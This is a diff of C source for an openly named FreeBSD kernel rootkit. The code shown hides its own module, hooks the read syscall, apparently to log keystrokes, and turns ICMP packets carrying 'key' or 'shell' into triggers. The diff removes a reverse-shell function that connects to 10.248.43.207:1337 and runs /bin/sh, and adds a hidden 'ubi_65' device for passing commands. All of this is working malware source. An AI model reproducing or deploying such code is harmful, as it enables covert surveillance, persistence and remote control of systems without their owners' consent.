@@ -14,7 +14,14 @@
 
 #include <sys/dirent.h>
 
-//========KEY LOGGING=========
+#include <sys/mbuf.h> 
+#include <sys/protosw.h>
+#include <netinet/in.h> 
+#include <netinet/in_systm.h> 
+#include <netinet/ip.h> 
+#include <netinet/ip_icmp.h> 
+#include <netinet/ip_var.h>
+
 #include <sys/pcpu.h>
 #include <sys/syscallsubr.h>
 #include <sys/unistd.h>
@@ -22,17 +29,13 @@
 #include <sys/file.h>
 #include <sys/fcntl.h>
 
-#include <arpa/inet.h>
-#include <netinet/in.h>
-#include <sys/socket.h>
-
-void reverse_shell();
-
-//=======HIDING KLD===========
-
 #include <sys/linker.h>
 #include <sys/lock.h>
 #include <sys/mutex.h>
+#include<sys/conf.h>
+
+//=======HIDING KLD===========
+
 
 #define MODULE_NAME "rootkit"
 #define FILE_NAME "rootkit.ko"
@@ -78,19 +81,76 @@ static struct linker_file *save_lf;
 static struct module *save_mod;
 
 //============TRIGGERING ICMP==============
-#include <sys/mbuf.h> 
-#include <sys/protosw.h>
-#include <netinet/in.h> 
-#include <netinet/in_systm.h> 
-#include <netinet/ip.h> 
-#include <netinet/ip_icmp.h> 
-#include <netinet/ip_var.h>
 
 #define KEYLOG "key"
 #define RSHELL "shell"
 
 extern struct protosw inetsw[]; 
 pr_input_t icmp_input_hook;
+
+// ======== PORT LISTENING  =============
+
+int dev_open(struct cdev *dev, int flag, int otyp, struct thread *td);
+int dev_close(struct cdev *dev, int flag, int otyp, struct thread *td);
+int dev_ioctl(struct cdev *dev, u_long cmd, caddr_t arg, int mode,struct thread *td);
+int dev_write(struct cdev *dev, struct uio *uio, int ioflag);
+int dev_read(struct cdev *dev, struct uio *uio, int ioflag);
+
+
+#define APP_NAME "shell"
+
+static char cmd[256+1];
+static struct sx cmd_lock;
+
+
+extern struct protosw inetsw[];
+pr_input_t icmp_input_hook;
+
+int dev_open(struct cdev *dev, int flag, int otyp, struct thread *td)
+{
+    return 0;
+}
+
+int dev_close(struct cdev *dev, int flag, int otyp, struct thread *td)
+{
+    return 0;
+}
+
+int dev_ioctl(struct cdev *dev, u_long cmd, caddr_t arg, int mode,struct thread *td)
+{
+    return 0;
+}
+
+
+int dev_write(struct cdev *dev, struct uio *uio, int ioflag)
+{
+    return 0;
+}
+int dev_read(struct cdev *dev, struct uio *uio, int ioflag)
+{
+    int len;
+    
+    sx_xlock(&cmd_lock);
+    copystr(&cmd, uio->uio_iov->iov_base, strlen(cmd)+1, &len);
+    
+    bzero(cmd,256);
+    sx_xunlock(&cmd_lock);
+   
+    
+    return 0;
+}
+
+static struct cdevsw devsw = {
+         .d_version = D_VERSION,
+         .d_open = dev_open,
+         .d_close = dev_close,
+         .d_read = dev_read,
+         .d_write = dev_write,
+         .d_ioctl = dev_ioctl,
+         .d_name = "ubi_65"
+};
+static struct cdev *sdev;
+
 
 //========================================
 
@@ -406,7 +466,6 @@ int icmp_input_hook(struct mbuf **m, int *off, int proto){
 
 	else if (strncmp(icp->icmp_data, RSHELL, 5) == 0) {
 			printf("send shell.\n");
-			reverse_shell();
 			return(0);
 	}
 	else
@@ -417,23 +476,6 @@ int icmp_input_hook(struct mbuf **m, int *off, int proto){
 }
 //==============================================================================
 
-void reverse_shell(){
-	struct sockaddr_in sa;
-    int s;
-
-    sa.sin_family = AF_INET;
-    sa.sin_addr.s_addr = inet_addr("10.248.43.207");
-    sa.sin_port = htons(1337);
-
-    s = socket(AF_INET, SOCK_STREAM, 0);
-    connect(s, (struct sockaddr *)&sa, sizeof(sa));
-    dup2(s, 0);
-    dup2(s, 1);
-    dup2(s, 2);
-
-    execve("/bin/sh", 0, 0);
-
-}
 
 
 
@@ -454,6 +496,8 @@ static int control(struct thread *td, void *arg) {
 
 		sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
 		inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
+		
+        sdev = make_dev(&devsw, 0, UID_ROOT, GID_WHEEL, 0600, "ubi_65");
 		hide_kld();
 		activated = 1;
 	}
@@ -463,6 +507,8 @@ static int control(struct thread *td, void *arg) {
 
 		sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
 		inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
+		
+		destroy_dev(sdev);
 		unhide_kld();
 		activated = 0;
 	}
